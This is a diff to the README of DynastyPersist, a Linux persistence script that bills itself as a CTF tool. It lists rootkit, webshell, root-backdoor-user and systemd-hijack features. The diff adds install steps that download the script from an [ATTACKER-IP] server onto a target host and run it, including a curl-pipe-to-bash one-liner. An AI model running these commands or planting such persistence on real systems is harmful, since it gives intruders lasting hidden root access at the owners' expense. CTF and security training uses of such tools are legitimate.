@@ -1,14 +1,10 @@
 
 <h1 align="center">DynastyPersist</h1>
 
-<div align="center">
-  <a target="_blank" href="#"><img src="https://i.postimg.cc/bN4DCJ1j/Screenshot-from-2023-10-02-07-03-19.png" width="450"></a>
-</div>
 
+* A CTF Tool for Linux persistence (KOTH, Battlegrounds)
 
-* A Linux persistence tool!
-
-* A powerul and versatile Linux persistence script designed for various security assessment and testing scenarios. This script provides a collection of features that demonstrate different methods of achieving persistence on a Linux system.
+* A powerful and versatile Linux persistence script designed for various security assessment and testing scenarios. This script provides a collection of features that demonstrate different methods of achieving persistence on a Linux system.
 
 ![GitHub](https://img.shields.io/github/license/trevohack/DynastyPersist)
 ![GitHub stars](https://img.shields.io/github/stars/trevohack/DynastyPersist)
@@ -21,7 +17,7 @@
 
 3. **Custom User with Root:** Creates a custom user with root privileges.
 
-4. **RCE Persistence:** Achieves persistence through remote code execution.
+4. **RCE Persistence:** Achieves persistence through remote code execution (php webshell).
 
 5. **LKM/Rootkit:** Demonstrates Linux Kernel Module (LKM) based rootkit persistence.
 
@@ -36,17 +32,22 @@
 10. **Modify an Existing Systemd Service:** Manipulates an existing systemd service for persistence.
 
 
-## Usage
+## Installation
 
 1. Clone this repository to your local machine:
 
-   ```bash
-   git clone https://github.com/Trevohack/DynastyPersist.git
+```bash
+$ git clone https://github.com/Trevohack/DynastyPersist.git
+
+$ python3 -m http.server 8080 
+root@tyler.thm # cd /opt && wget -c [ATTACKER-IP]:8080/DynastyPersist && cd DynastyPersist && chmod +x dynasty.sh && ./dynasty.sh
+``` 
 
 2. One linear
    
-   ```bash
-   curl -sSL https://raw.githubusercontent.com/Trevohack/DynastyPersist/main/src/dynasty.sh | bash
+```bash
+curl -sSL [ATTACKER-IP]8080/DynastyPersist/dynasty.sh | bash
+``` 
 
 ## Support
 
